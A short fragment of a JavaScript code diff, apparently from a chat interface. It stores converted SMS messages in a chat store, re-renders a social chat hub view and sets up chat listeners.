+                    app: 'sms'
+                };
+            });
+            allChatStore.sms = converted;
+            renderSocialChatHub(false);
         });
     }
     setupChatListeners();
